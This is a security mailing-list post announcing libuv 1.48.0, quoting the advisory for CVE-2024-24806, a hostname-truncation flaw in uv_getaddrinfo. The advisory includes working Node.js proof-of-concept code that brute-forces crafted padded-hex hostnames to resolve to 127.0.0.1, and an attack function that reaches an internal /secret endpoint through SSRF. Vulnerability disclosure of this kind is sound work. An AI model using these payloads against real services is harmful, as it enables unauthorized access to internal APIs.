@@ -1,0 +1,135 @@
+
+Date: Thu, 8 Feb 2024 12:15:23 -0800
+From: Alan Coopersmith <alan.coopersmith@...cle.com>
+To: oss-security@...ts.openwall.com
+Subject: libuv 1.48.0 released, fixes CVE-2024-24806
+
+https://github.com/libuv/libuv/releases/tag/v1.48.0 shows the release
+yesterday of stable release 1.48.0, including a fix for CVE-2024-24806.
+
+https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6
+offers this information about that CVE:
+
+> Affected versions: > 1.45.x
+> Patched versions:   v1.48.0
+> > Summary:
+> 
+> The uv_getaddrinfo function in src/unix/getaddrinfo.c (and its windows
+> counterpart src/win/getaddrinfo.c), truncates hostnames to 256
+> characters before calling getaddrinfo. This behavior can be exploited
+> to create addresses like 0x00007f000001, which are considered valid by
+> getaddrinfo and could allow an attacker to craft payloads that resolve
+> to unintended IP addresses, bypassing developer checks.
+> 
+> Details:
+> 
+> The vulnerability arises due to how the hostname_ascii variable (with
+> a length of 256 bytes) is handled in uv_getaddrinfo and subsequently
+> in uv__idna_toascii. When the hostname exceeds 256 characters, it gets
+> truncated without a terminating null byte. Depending on the build and
+> runtime environment, it can lead to different exploitation scenarios:
+> 
+>  1. For example In some nodejs builds, like the one distributed
+>     with Kali Linux, the next byte in memory happens to be a null
+>     byte, making the truncated hostname valid.
+> 
+>  2. In other builds, the last byte of the hostname is a random value
+>     (0-256) but identical in successive calls, and the subsequent byte
+>     is a null byte. This situation can be exploited through brute
+>     force, especially in production environments where many Node.js
+>     instances run in parallel (pm2, kubernetes, etc).
+> 
+>  3. Since the last byte is random, there are cases where it's one of
+>     0-9a-f, which makes 16 possible cases (out of 256) useful for
+>     calling localhost (127.0.0.x) and potentially bypassing security
+>     measures on internal APIs. The same is true for calling other
+>     IP-ranges.
+> 
+> PoC
+> 
+> // nodejs reproduction code:
+> const dns = require('dns');
+> async function run(ip, exactIP) {
+>   let hexIP = ip.split('.').map(x => (+x).toString(16).padStart(2, '0')).join('');
+>   if (!exactIP) {
+>     hexIP = hexIP.substring(0, hexIP.length - 1);
+>   }
+> 
+>   const payload = `0x${'0'.repeat(256-hexIP.length-2)}${hexIP}.example.com`;
+>   dns.lookup(payload, (err, addr) => {
+>     if (err); // not successful
+>     else if (addr === ip) console.log('*', addr);
+>     else console.log(' ', addr); // resolved to a shifted ip-address
+>   });
+> }
+> 
+> if (process.argv[2]) {
+>   run ('4.2.2.4', true) // exact match, less probable (P=1/256), for kali-like builds works perfectly
+>   // run('127.0.0.1', false); // any 127.0.0.x, higher probability (P=1/32)
+> } else {
+>   const cp = require('child_process')
+>   for (let i=0; i<1024; ++i) {
+>     cp.spawn('node', [process.argv[1], 'x'], { stdio: 'inherit' });
+>   }
+> }
+> 
+> Impact
+> 
+>     Access to Internal APIs:
+> 
+>     The following code, when deployed in an environment with multiple
+>     pods (e.g., Kubernetes), is vulnerable to the attack described
+>     above, potentially allowing unauthorized access to internal APIs.
+> 
+>     const axios = require('axios');
+>     const express = require('express');
+> 
+>     const app = express();
+>     app.get('/', async (req, res) => {
+>         const url = req.query?.url || '';
+>         if (new URL(url).hostname.endsWith('.example.com')) {
+>           try {
+>             const { data } = await axios.get(url, { timeout: 3000 });
+>             res.send(data);
+>           } catch(e) {
+>             res.status(400).send('error');
+>           }
+>         } else {
+>           res.status(400).send('Invalid url');
+>         }
+>     });
+>     app.listen(80);
+> 
+>     // internal endpoint available only to local IPs
+>     // (in reality deployed inside another service)
+>     const internalApp = express();
+>     internalApp.get('/secret', (req, res) => {
+>       res.send('the secret panel');
+>     });
+>     internalApp.listen(3000);
+> 
+>     // pm2 start s1.js -i 128
+> 
+>     function attack() {
+>       for (let i=0; i<128; i++) {
+>         const payload = '0x' + '0'.repeat(246) + '7f000001';
+>         fetch(`http://localhost?url=http://${payload}.example.com:3000/secret`)
+>           .then(x => x.text())
+>           .then(console.log);
+>       }
+>     }
+> 
+>     SSRF Attack:
+> 
+>     Another scenario involves websites (similar to MySpace) that
+>     allows users to have username.example.com pages. Internal services
+>     that crawl or cache these user pages can be exposed to SSRF
+>     attacks if a malicious user chooses a long vulnerable username.
+> 
+> Severity: High
+> CVE ID: CVE-2024-24806
+> Credits: @arash16 Reporter
+
+-- 
+         -Alan Coopersmith-                 alan.coopersmith@...cle.com
+          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
